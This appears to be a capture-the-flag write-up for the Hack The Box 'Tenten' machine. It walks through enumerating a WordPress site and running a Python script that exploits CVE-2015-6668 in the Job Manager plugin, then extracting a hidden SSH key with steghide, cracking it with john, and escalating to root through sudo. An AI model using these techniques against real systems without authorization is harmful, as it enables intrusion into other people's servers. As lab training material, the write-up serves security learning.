![logo](/logo.png)

# [Tenten- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 22 Mar 2017 as the eight machine on HTB,Tenten created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  *Apache 
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/tenten 10.10.10.10
```

###### Output 

![](/Linux/Linux-Medium/Tenten/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/tenten 10.10.10.10                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 08:45 EAT
Nmap scan report for 10.10.10.10
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://tenten.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.84 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu Linux`and its running an `Apache httpd 2.4.18`.  With a host name of [http://tenten.htb](http://tenten.htb)

port[22]- ssh
port[80]-  http

so first thing firdt lets add the hostname to our `/etc/hosts`

![](/Linux/Linux-Medium/Tenten/Screenshots/etc.png)


When we navigate to [http://tenten.htb](http://tenten.htb) we find out that it a wordpress page 

![](Linux/Linux-Medium/Tenten/Screenshots/wordpress.png)

Now that its running a wordpress we just going to do an automated script for wordpress to check for vulnerabilities.

```sh
wpscan --url http://tenten.htb -e ap --plugins-detection aggressive
```

![](/Linux/Linux-Medium/Tenten/Screenshots/wpsacan.png)

looking at the now results we find that it has a readme which specifies that wordpress is version `4.7`

![](/Linux/Linux-Medium/Tenten/Screenshots/wordpressv.png)

now after doing some search i found out that their is a page in jobs where we can access other pages by just changing the `uid` of the page 

# Exploitation


![](/Linux/Linux-Medium/Tenten/Screenshots/Uid.png)
![](/Linux/Linux-Medium/Tenten/Screenshots/uid1.png)

now lets go back to the previous page and upload something so that we can be able to do a for loop to check for It 

![](/Linux/Linux-Medium/Tenten/Screenshots/Application.png)

now we generate a for loop to check for the application we submitted.

```sh
for i in $(seq 1 20); do echo -n "$i: "; curl -s http://tenten.htb/index.php/jobs/apply/$i/ | grep '<title>'; done
```

![](Linux/Linux-Medium/Tenten/Screenshots/forloop.png)

As we can see that is what we uploaded but when we try to look for it in the web browser we find that we are unable so we look for a script that abuses the Job manager [exploit](https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef) we modify for ranges and file types.

from our ealier scan on `wpscan` it show as two vulnerable plugin 

![](/Linux/Linux-Medium/Tenten/Screenshots/wpscan.png)

```sh
import requests

print("""  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
""")

website = input('Enter a vulnerable website: ')
filename = input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017, 2019):
    for i in range(3, 13):
        for extension in {'jpeg', 'png', 'jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code == 200:
                print("[+] URL of CV found! " + URL)
```

so by using the script above we get the url for `HackerAccessGranted`

![](/Linux/Linux-Medium/Tenten/Screenshots/url.png)

By browsing the page we get an Image 

![](Linux/Linux-Medium/Tenten/Screenshots/hackersgranted.png)

so we need to save the image because so that we can check it it store any information 

```sh
steghide extract -sf HackerAccessGranted.jpg
```

it looks like someone hide a rsa text to the image

![](/Linux/Linux-Medium/Tenten/Screenshots/rsa.png)

now we need to crack the `id_rsa` but first we make it crackable with `john`

```sh
ssh2john id_rsa
```

![](/Linux/Linux-Medium/Tenten/Screenshots/ssh2john.png)

now we copy this in to a new file and be able to crack it with john and default kali linux rockyou.txt wordlist.

```sh
john id_rsa_john_encrypted --wordlist=/usr/share/wordlists/rockyou.txt 
```

![](/Linux/Linux-Medium/Tenten/Screenshots/john.png)

now we use the password and the `id_rsa` to log in as root.

```sh
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.10
```

![](/Linux/Linux-Medium/Tenten/Screenshots/rootfail.png)

but it fails but we rember their was a user called `takis` from the blog post so lets log in as him

![](/Linux/Linux-Medium/Tenten/Screenshots/tarkis.png)

we can get the user flag from the user 

![](/Linux/Linux-Medium/Tenten/Screenshots/userflag.png)

#  Privillage Escalation

after trying `takis` password on root it resufes so what i do I just run  `sodo -l` which will show if their is something that i can run without root privillages.

```sh
sudo -l
```

![](/Linux/Linux-Medium/Tenten/Screenshots/privillage.png)

so let me check the file so that we se what it does 

![](/Linux/Linux-Medium/Tenten/Screenshots/binbash.png)

it just does a `bin/bash` and enable us to run comands so lets run it

![](/Linux/Linux-Medium/Tenten/Screenshots/root.png)

and just that way we are root.

![](/Linux/Linux-Medium/Tenten/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------
